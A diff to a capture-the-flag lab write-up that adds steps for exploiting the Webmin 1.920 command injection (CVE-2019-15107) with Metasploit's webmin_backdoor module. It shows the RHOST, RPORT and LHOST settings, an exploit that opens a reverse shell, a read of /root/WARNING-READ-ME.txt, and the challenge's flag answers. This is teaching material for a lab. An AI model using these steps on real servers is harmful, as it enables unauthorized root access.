@@ -160,7 +160,7 @@ This shows several entries, with two particularly relevant to our target version
 - `Webmin 1.920 - Remote Code Execution`
 - `Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)`
 
-#### Step 3: Identify the CVE to Find the Task2 Flag
+#### Step 2: Identify the CVE to Find the Task2 Flag
 
 Each known vulnerability is cataloged with a **CVE (Common Vulnerabilities and Exposures)** identifier. To find the specific CVE linked to Webmin 1.920, you can:
 
@@ -176,4 +176,113 @@ This vulnerability allows **unauthenticated attackers** to execute arbitrary com
 Fill in the flag **CVE-2019-15107** and submit to complete task 2: s
 
 ![](img/s_11.png)
+
+
+
+------
+
+### CTF Challenge Q3: Exploit the Vulnerability
+
+Question Task:
+
+- Use the **Metasploit framework** to exploit the discovered Webmin vulnerability (**CVE-2019-15107**) with a command injection attack.
+
+- A leaked document from a BlackCat member named *Eve* indicates that their previous hacking attempts were logged in a file named `WARNING-READ-ME.txt`, located under a user’s folder, the flag may be in the file.
+
+- Find the **five-digit number** hidden in `/root/WARNING-READ-ME.txt` on the target server. 
+
+  
+
+#### Step 1: Launch Metasploit and Select the Exploit
+
+The tool you are looking for is called Metasploit which has been pre-installed in the Kali linus. Exploits in Metasploit are ready-made scripts that automatically attack a vulnerability. They save you time during penetration testing: you do not need to program or download custom exploits, but you simply use existing attack scripts that someone created for the common vulnerabilities. Check out the tutorial at https://www.offensive-security.com/metasploit-unleashed/metasploit-fundamentals/
+
+Start metaplot console tool with cmd: `msfconsole`, the console will be shown as below:
+
+![](img/s_12.png)
+
+Then we need to search whether the metasploit provides the modules which can exploit the vulnerability point.  There is a search command in Metasploit (msfconsole) to find the correct exploit, search for available exploits related to Webmin:
+
+```
+search webmin
+```
+
+The result is shown below:
+
+![](img/s_13.png)
+
+From the results, we select the exploit:
+
+```bash
+exploit/linux/http/webmin_backdoor
+```
+
+This module directly targets **CVE-2019-15107**, the command injection flaw in Webmin’s `password_change.cgi`. Activate it using:
+
+```bash
+use exploit/linux/http/webmin_backdoor
+show options
+```
+
+This will display the configurable parameters needed to run the exploit.
+
+
+
+#### Step 2: Configure Exploit Options
+
+Based on the previous step, each activated exploit has its options -- parameters that you must set after you activated the exploit but before you run it. The parameters we used to do the vulnerability scan are host and port configuration:  
+
+- **RHOSTS** : The target host ip address, it needs to be set to the IP address of the victim, cmd :  `set RHOSTS 172.18.1.5`.
+- **RPORT** : The target host tcp port, it needs to be set to desired port number, i.e., 10000.
+- **LHOST** : The source host id address, needs to be set to the machine that initiates the exploit (you), cmd:  `set LHOST 10.10.135.83`.
+
+Now set the target host when want to do penetration with **RHOST**, set our attack Kali machine as **LHOST**, and **RPORT** the one we find in section 1 which is 10000. Then use check cmd to see whether the http web service is is vulnerable by using the **webmin_backdoor module**.  Commands:
+
+```
+Exploit target:
+msf6 exploit(linux/http/webmin_backdoor) > set RHOST 172.18.1.5
+RHOST => 172.18.1.5
+msf6 exploit(linux/http/webmin_backdoor) > set RPORT 10000
+RPORT => 10000
+msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.135.83
+LHOST => 10.10.135.83
+msf6 exploit(linux/http/webmin_backdoor) > check
+```
+
+If configured correctly, Metasploit confirms that the service is vulnerable. Then, run the exploit:
+
+```
+exploit
+```
+
+Your terminal should display a **reverse shell session opened** message, as shown in the screenshot:
+
+![](img/s_14.png)
+
+This means you now have shell access to the target server through the backdoor.
+
+
+
+#### Step 3: Locate the Evidence File
+
+With shell access, navigate and search for the suspicious file mentioned in the challenge:
+
+```
+find /root -name "WARNING-READ-ME.txt"
+cat /root/WARNING-READ-ME.txt
+```
+
+The result is shown below: 
+
+![](img/s_15.png)
+
+As shown above, the **user 25790**  is the flag information, enter this value into the challenge portal to complete Task 3:
+
+![](img/s_16.png)
+
+**> The correct answer(flag) is:**  `25790`
+
+
+
+------
 
